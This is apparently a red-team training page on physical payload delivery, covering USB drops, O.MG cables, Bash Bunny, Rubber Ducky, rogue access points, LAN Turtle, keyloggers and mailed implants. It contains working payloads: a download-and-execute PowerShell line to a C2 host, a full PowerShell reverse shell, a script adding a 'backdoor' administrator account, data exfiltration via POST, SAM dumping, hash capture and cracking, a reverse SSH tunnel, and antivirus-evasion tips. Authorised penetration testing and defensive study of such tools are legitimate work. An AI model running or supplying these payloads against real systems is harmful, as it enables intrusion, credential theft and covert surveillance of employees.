---
layout: training-page
title: "Physical Payload Delivery — Red Team Academy"
module: "Physical Red Team"
tags:
  - physical
  - payloads
  - hardware
  - usb
  - implants
page_key: "physical-physical-payloads"
render_with_liquid: false
---

# Physical Payload Delivery

Physical payload delivery bridges the gap between physical access and persistent digital presence. Once an operator is inside a facility, they can deploy hardware implants, USB attack tools, and rogue network devices that provide long-term footholds impossible to achieve purely through remote exploitation.

## USB Drops: Psychology and Weaponization

### The Psychology of Found USB Drives

Research (including the 2016 University of Illinois study at DEFCON) consistently demonstrates that 45-60% of found USB drives are plugged in by finders, with the number rising to 90%+ when a label is attached with enticing text.

```
Label strategies ranked by effectiveness:
  1. "[Company Name] Q4 Financial Results CONFIDENTIAL"  
  2. "Employee Salaries 2024"
  3. "My Resume"
  4. "[Target's Name] Personal Photos"
  5. "DO NOT OPEN — Legal Department"
  6. (No label — lowest effectiveness)

Drop locations ranked by operator success rates:
  1. Parking lot (ground, near car) — plausible "dropped from pocket"
  2. Conference room tables (left behind after meeting)
  3. Shared printer/copier area
  4. Break room counter
  5. Bathroom counter
  6. Reception desk area
```

### Weaponizing USB Drives: HID Attack Payloads

USB drives with embedded microcontrollers can present as Human Interface Devices (keyboards) and inject keystrokes at machine-speed.

```
Preparation workflow (example: Windows target):

Step 1 — Generate payload
  # PowerShell download-and-execute (Rubber Ducky syntax)
  GUI r
  DELAY 500
  STRING powershell -w hidden -c "iex(iwr 'https://c2.yourdomain.com/s.ps1').Content"
  ENTER

Step 2 — Encode for device
  # Compile Rubber Ducky script
  java -jar duckencode.jar -i payload.txt -o inject.bin

Step 3 — Write to device
  # Copy inject.bin to USB drive root (Rubber Ducky reads on plug-in)

Step 4 — Drop in target location
  # Label appropriately per psychology above

Advanced: Autorun payloads for Windows (disabled in Win 7+ for USB)
  - Autorun.inf no longer works for .exe launch on modern Windows
  - BUT: .lnk files with specially crafted paths DO execute code when
    the drive is browsed in Explorer (CVE-2010-2568 pattern — patched)
  - Modern: rely on HID attack (keyboard) not autorun
```

## O.MG Cable

The O.MG Cable is a weaponized USB cable with embedded WiFi, HID injection capabilities, and a web-accessible command interface. It is physically indistinguishable from a standard Apple Lightning or USB-C cable.

### Setup and Configuration

```bash
# Initial setup (O.MG Elite — USB-A to Lightning example)

# Step 1: Flash firmware
# Connect O.MG to programmer → use O.MG Programmer app (iOS/Android)
# OR: web flasher at https://o.mg.lol/setup

# Step 2: Configure WiFi access point
# Default AP: "O.MG" — CHANGE THIS before deployment
# Configure to connect to your controlled AP or create hidden SSID

# Step 3: Write payloads via O.MG Programming Interface
# Connect to O.MG WiFi → navigate to 192.168.4.1
# Payload editor uses DuckyScript syntax:

DELAY 3000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$c='yourc2.com';$p=4444;$t=New-Object System.Net.Sockets.TCPClient($c,$p);$s=$t.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$rb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($rb,0,$rb.Length)}"
ENTER

# Step 4: Exfiltration via WiFi C2
# O.MG supports keylogging mode: all keystrokes sent to your server
# Enable: Settings → Keylogger → On → set exfil URL
```

### Deployment Scenarios

```
Scenario 1: Charging cable replacement
  - Swap victim's charging cable at unattended desk during visit
  - Cable activates payload when device is unlocked and connected
  - Retrieve cable at end of engagement (or leave if sacrificial)

Scenario 2: Conference room drop
  - Leave O.MG cable on conference table labeled "iPhone charger"
  - Trigger manually via WiFi when someone plugs in during meeting

Scenario 3: Mail delivery
  - Ship O.MG cable in branded packaging to target contact
  - Social engineering: "Free sample from [vendor]"
  - Risk: cable may be tested on non-target device
```

## Bash Bunny

The Bash Bunny (Hak5) is a multi-mode USB attack platform with an embedded Linux system.

### Modes

```
Physical switch positions:
  Position 1: Attack payload 1 (switch/payloads/switch1/)
  Position 2: Attack payload 2 (switch/payloads/switch2/)
  Position 3: Arming mode (for setup and payload writing)

Device modes:
  ATTACKMODE HID         → Keyboard (keystroke injection)
  ATTACKMODE STORAGE     → USB mass storage (mounts as drive)
  ATTACKMODE ECM_ETHERNET → Ethernet adapter (network pivoting)
  ATTACKMODE HID STORAGE → Both simultaneously
  ATTACKMODE HID ECM_ETHERNET → Both simultaneously
```

### Attack Sequences

```bash
# Payload: Windows credential extraction via HID + ECM_ETHERNET
# payloads/switch1/payload.sh

#!/bin/bash
LED ATTACK
ATTACKMODE ECM_ETHERNET HID

# Wait for network interface to come up
sleep 5

# Inject keystrokes to run command as SYSTEM via PowerShell
HID_INJECT 'powershell -w hidden Start-Process powershell -Verb RunAs'
sleep 2
HID_INJECT 'powershell -w hidden "reg save HKLM\SAM /tmp/sam"'

# Pull SAM over ethernet (Bash Bunny acts as RNDIS/ECM device)
# DHCP hands out .1/.2 — use impacket from BunnyIP

QUACK STRING "powershell -c 'Invoke-WebRequest http://172.16.64.1/run.ps1 | iex'"
QUACK ENTER

LED FINISH
```

```bash
# Payload: QuickCreds (credential capture via responder)
# Install: /root/udisk/tools/responder (pre-installed on Bash Bunny)

#!/bin/bash
ATTACKMODE ECM_ETHERNET

sleep 5

# Start Responder to capture NTLMv2 hashes
responder -I usb0 -wrf &

# Hashes stored at /root/udisk/loot/
```

## Rogue Access Points

### WiFi Pineapple Deployment

The WiFi Pineapple (Hak5) creates rogue access points and performs automated MITM attacks.

```
Physical deployment:
  - Power: USB power bank (20,000 mAh = 8-12 hours runtime)
  - Concealment: inside laptop bag, behind ceiling tile, under desk
  - Footprint: Pineapple NANO fits in palm of hand
  - Range: 50-100 meters depending on antenna and environment

Quick setup for captive portal credential harvest:
  Pineapple NANO setup:
  1. Connect to Pineapple management AP
  2. Navigate to 172.16.42.1:1471
  3. Modules → Captive Portal → Configure
     - SSID: "[Target Company] Guest WiFi" (match observed SSID)
     - Portal page: clone of target's actual captive portal
     - Credentials saved to /pineapple/modules/CaptivePortal/log/

  Evil Portal (advanced):
  1. Install Evil Portal module
  2. Clone target portal HTML
  3. Deploy at employee WiFi SSID (matches remembered network)
  4. WPA2-EAP capture: Hostapd-WPE for 802.1X enterprise attacks
```

### Hostapd-WPE for WPA2-Enterprise

```bash
# Rogue AP for WPA2-Enterprise (MSCHAPv2 capture)
# Target: corporate WiFi with RADIUS authentication

# Install on Raspberry Pi or similar
sudo apt install hostapd-wpe

# Configure /etc/hostapd-wpe/hostapd-wpe.conf:
interface=wlan0
ssid=CorpWiFi               # Match target SSID exactly
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/ssl/certs/hostapd-wpe.pem
server_cert=/etc/ssl/certs/hostapd-wpe.pem
private_key=/etc/ssl/private/hostapd-wpe.key

# Run (captures MSCHAPv2 NTLMv2 handshakes automatically)
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Output example:
# username: jdoe@corp.com
# challenge: 1234567890abcdef
# response: aabbccddeeff...

# Crack with Asleap or Hashcat (mode 5500):
hashcat -m 5500 captured.txt /wordlists/rockyou.txt
```

## LAN Turtle

The LAN Turtle is an inline network implant disguised as a USB Ethernet adapter.

### Deployment

```
Physical placement:
  - Insert between target computer's Ethernet port and wall jack
  - Or: plug into open Ethernet port in network closet
  - LAN Turtle provides: Ethernet passthrough (transparent to user)
  - Draws power from USB port

Network architecture on deployment:
  TARGET PC → [USB] → LAN Turtle → [Ethernet] → WALL JACK → NETWORK

LAN Turtle modules (via module manager):
  - AutoSSH: establishes persistent reverse SSH tunnel to operator VPS
  - Responder: NTLMv2 capture on segment
  - Meterpreter: run msf module directly from device
  - KeySweeper: (WiFi adapter version) capture wireless keyboard

AutoSSH configuration for reverse tunnel:
  # On operator VPS (public IP):
  # /etc/ssh/sshd_config → GatewayPorts yes

  # On LAN Turtle:
  # Module → AutoSSH → configure:
    SSH Server: [YOUR_VPS_IP]
    SSH Port: 22
    Remote Port: 2222
    Local Port: 22

  # Access compromised network from VPS:
  ssh -p 2222 localhost
  # Now you're on the internal network
```

## Rubber Ducky

The USB Rubber Ducky is a pure HID keystroke injection device.

### Script Writing

```
DuckyScript 3.0 syntax examples:

# Basic payload: Open CMD and run command
DELAY 1000
GUI r
DELAY 500
STRING cmd /k powershell -c "whoami"
ENTER

# Escalated: UAC bypass + execute
DELAY 1000
GUI x
DELAY 500
STRING a
DELAY 2000
ALT y
DELAY 1000
STRING net user backdoor P@ssw0rd123 /add
ENTER
STRING net localgroup administrators backdoor /add
ENTER

# Exfil: collect and POST to operator server
STRING powershell -w hidden -c "$d=@{h=(hostname);u=(whoami);n=(Get-NetIPAddress|?{$_.AddressFamily -eq 'IPv4'}|Select -Exp IPAddress)};Invoke-RestMethod -Uri 'https://c2.example.com/loot' -Method Post -Body ($d|ConvertTo-Json)"
ENTER

# Compile DuckyScript 3.0
# Tools: duckuino encoder (web), hak5-payloads GitHub repository
```

### Keystroke Rate

```
Default injection rate: ~1000 characters/second
Some systems cannot handle this → add DEFAULTDELAY 50 at script top
Corporate SOEs: may have USB device control (allow/block by class)
  - HID keyboards: often whitelisted (needed for legacy devices)
  - USB mass storage: often blocked by DLP controls
```

## Hardware Keylogger Installation

```
Device types:
  KeyGrabber AirLogger: Plugs between keyboard USB and PC
    - No software required
    - Logs up to 16MB of keystrokes
    - WiFi model transmits logs wirelessly
  
  KeyGrabber Nano: Minimal footprint version
    - Fits partially behind PC USB port (mostly hidden)
    - Retrieves logs by: plug → wait → USB drive appears → copy log file → unplug

  PS/2 keylogger: For legacy keyboards

Installation procedure:
  1. Locate target workstation (unattended, ideally during lunch or meeting)
  2. Reach behind PC or to USB port location
  3. Unplug keyboard USB cable
  4. Insert keylogger between keyboard and PC
  5. Verify keyboard functions normally (test a key)
  6. Return at agreed interval to retrieve log
  
  Retrieval:
    - KeyGrabber AirLogger: connect to device WiFi → access log over HTTP
    - Standard: unplug device, connect to analyst machine → USB drive mounts
      → log file is plain text with timestamps

Risk: target may notice unfamiliar device at workstation
Mitigation: match device color to existing USB devices
```

## Network Tap Installation

```
Passive network tap (Throwing Star LAN Tap):
  - Splits Ethernet signal passively (no power required)
  - Two capture ports: one for each direction (TX/RX)
  - Connect capture ports to capture laptop running Wireshark/tcpdump

  Installation:
  TARGET PC ─ [Ethernet] → [Throwing Star TAP] ─ [Ethernet] → SWITCH
                                   ↓
                           [CAPTURE LAPTOP]

  Capture:
  sudo tcpdump -i eth1 -w /tmp/capture.pcap
  # Analyze with Wireshark on operator workstation

Active inline tap (Dualcomm ETAP):
  - Powered, active version
  - Supports both 10/100 and Gigabit
  - Better for VoIP and high-speed traffic capture

Network closet placement:
  - Patch panel to switch connections are ideal tap points
  - Target: ports connected to workstations in HR, Finance, Executive
  - Dwell time: leave for 24-72 hours then retrieve
  - Risk: physical access to wiring closet may be logged by building access control
```

## Mail and Courier Delivery Payloads

```
Concept: Deliver weaponized payload to target via legitimate shipping channel

Package design:
  - Use legitimate shipping label from real company
  - Inside: O.MG cable in branded USB peripheral packaging
  - Label: "Requested by [Name from LinkedIn] — USB-C Ethernet Adapter"
  - Include fake invoice from peripheral supplier

Success factors:
  - Target must plug in device
  - Best targets: IT staff (likely to test hardware)
  - Social engineering hook: "replacement for defective unit"
  - Avoid targets with strict procurement controls (may require PO number)

Tracking and activation:
  - O.MG Cable: activate remotely over WiFi when device connects
  - Bash Bunny: requires physical switch — pre-set before shipping
  - Passive keylogger: self-activating (no trigger needed)
  
  Confirm delivery via: shipping carrier tracking
  Confirm connection: O.MG phone-home signal, reverse tunnel establishment
```

## Payload Operational Security

```
Pre-deployment checklist:
  □ Payload tested on identical hardware in lab environment
  □ C2 infrastructure is up and accessible from target network range
  □ Callback tested: payload → C2 connection confirmed
  □ Anti-virus evasion confirmed (test on VirusTotal? NO — see note below)

CRITICAL: Never submit operational payloads to VirusTotal.
  VirusTotal shares samples with all AV vendors.
  If you submit your payload, it will be detected by all vendors within 24-48 hours.
  Use offline scanners: 
    # Test payload against AV engines offline
    # Set up Windows VM, install AV of choice, test locally
    # Or use private scanning (Kleenscan, Antiscan.me — paid, do not share)

Post-deployment tracking:
  □ Document exact location of each deployed device (for retrieval)
  □ Note network MAC addresses of deployed LAN Turtles (for removal)
  □ Record timestamp of each device placement
  □ Include all placed devices in final report (even if no callback received)
```
